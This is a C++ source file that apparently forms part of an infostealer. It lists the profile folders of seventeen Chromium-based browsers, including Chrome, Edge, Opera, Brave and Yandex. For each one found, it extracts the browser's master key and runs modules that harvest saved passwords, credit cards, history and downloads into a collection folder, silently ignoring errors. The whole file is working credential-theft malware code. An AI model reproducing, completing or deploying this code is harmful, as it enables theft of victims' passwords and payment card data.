//
// Created by .1qxz on 08.06.2024.
//

#include "ChromiumBrowsers.h"
#include "impl/CHistory.h"
#include "impl/CCreditCards.h"
#include "impl/CDownloads.h"
#include "impl/CPasswords.h"

static const std::vector<std::pair<std::string, fs::path>> CHROMIUM_BROWSERS = {
    {"Opera",        Utils::getRoamingPath() / "Opera Software"       / "Opera Stable"               },
    {"Amigo",        Utils::getLocalPath()   / "Amigo"                / "User Data"                  },
    {"Torch",        Utils::getLocalPath()   / "Torch"                / "User Data"                  },
    {"Kometa",       Utils::getLocalPath()   / "Kometa"               / "User Data"                  },
    {"Orbitum",      Utils::getLocalPath()   / "Orbitum"              / "User Data"                  },
    {"Epic Private", Utils::getLocalPath()   / "Epic Privacy Browser" / "User Data"                  },
    {"Cent",         Utils::getLocalPath()   / "CentBrowser"          / "User Data"                  },
    {"Vivaldi",      Utils::getLocalPath()   / "Vivaldi"              / "User Data"                  },
    {"Irdium",       Utils::getLocalPath()   / "Iridium"              / "User Data"                  },
    {"7Star",        Utils::getLocalPath()   / "7Star"                / "7Star"         / "User Data"},
    {"Sputnik",      Utils::getLocalPath()   / "Sputnik"              / "Sputnik"       / "User Data"},
    {"Chrome SxS",   Utils::getLocalPath()   / "Google"               / "Chrome SxS"    / "User Data"},
    {"Chrome",       Utils::getLocalPath()   / "Google"               / "Chrome"        / "User Data"},
    {"Edge",         Utils::getLocalPath()   / "Microsoft"            / "Edge"          / "User Data"},
    {"Uran",         Utils::getLocalPath()   / "uCozMedia"            / "Uran"          / "User Data"},
    {"Yandex",       Utils::getLocalPath()   / "Yandex"               / "YandexBrowser" / "User Data"},
    {"Brave",        Utils::getLocalPath()   / "BraveSoftware"        / "Brave-Browser" / "User Data"},
};

ChromiumBrowsers::ChromiumBrowsers() {
    this->modules.push_back(new CHistory());
    this->modules.push_back(new CCreditCards());
    this->modules.push_back(new CDownloads());
    this->modules.push_back(new CPasswords());
}

void ChromiumBrowsers::execute(fs::path &root) {
    std::vector<std::thread> threads;

    for(const std::pair<std::string, fs::path> &browser : CHROMIUM_BROWSERS)
    {
        if(!exists(browser.second))
            continue;

        threads.emplace_back([browser, &root, this]() {
            std::vector<std::thread> moduleThreads;

            fs::path browserRoot = root / "Browsers" / browser.first;

            std::vector<BYTE> master_key = ChromiumUtil::getMasterKey(browser.second);

            if(master_key.empty())
                return;

            for(ChromiumBrowserModule* module : this->modules)
            {
                module->setMasterKey(master_key);
                moduleThreads.emplace_back([module, &browser, &browserRoot, &master_key]() {
                    try
                    {
                        module->execute(browserRoot, browser.first, browser.second);
                    }
                    catch (const std::exception& e)
                    {
                        #if DEV
                            std::cerr << "DEBUG ERROR: " << e.what() << std::endl;
                        #endif
                    }
                    catch (...){}
                });
            }

            for(auto& thread : moduleThreads) {
                if (thread.joinable()) {
                    thread.join();
                }
            }
        });
    }

    for(auto& thread : threads) {
        if (thread.joinable()) {
            thread.join();
        }
    }
}
